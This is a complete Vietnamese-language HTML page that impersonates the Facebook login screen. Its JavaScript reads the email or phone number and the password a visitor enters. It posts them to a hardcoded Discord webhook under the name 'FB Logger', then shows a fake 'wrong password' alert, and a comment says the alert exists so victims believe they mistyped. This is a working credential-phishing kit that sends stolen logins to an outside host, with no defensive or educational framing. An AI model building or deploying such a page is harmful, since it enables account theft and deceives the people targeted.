<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Đăng nhập</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(#f0f2f5, #fff);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 30px 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 320px;
        }
        .login-container img {
            width: 60px;
            margin-bottom: 20px;
        }
        .input-field {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-field input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
        }
        .login-button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 10px;
        }
        .login-button:hover {
            background-color: #145dbf;
        }
        .forgot-password {
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <div class="input-field">
        <input type="text" id="email" placeholder="Số di động hoặc email">
    </div>
    <div class="input-field">
        <input type="password" id="password" placeholder="Mật khẩu">
    </div>
    <button class="login-button" onclick="sendToDiscord()">Đăng nhập</button>
    <a class="forgot-password" href="#">Bạn quên mật khẩu ư?</a>
</div>

<script>
    function sendToDiscord() {
        var email = document.getElementById("email").value;
        var password = document.getElementById("password").value;

        var webhookURL = "https://discord.com/api/webhooks/1366030714214154260/ZAi-L4U2zXtmbx1ScW5CYxZ4cPDzQ1cf3eCj1GTLlxLwYByuqZeW4fBsw14iqn8KMIai";

        var request = new XMLHttpRequest();
        request.open("POST", webhookURL);

        request.setRequestHeader('Content-type', 'application/json');

        var params = {
            username: "FB Logger",
            content: "**Số di động hoặc Email:** " + email + "\n**Mật khẩu:** " + password
        }

        request.send(JSON.stringify(params));

        // Giả vờ báo lỗi đăng nhập để người dùng tưởng mình nhập sai
        alert("Sai mật khẩu. Vui lòng kiểm tra lại thông tin đăng nhập.");
    }
</script>

</body>
</html>
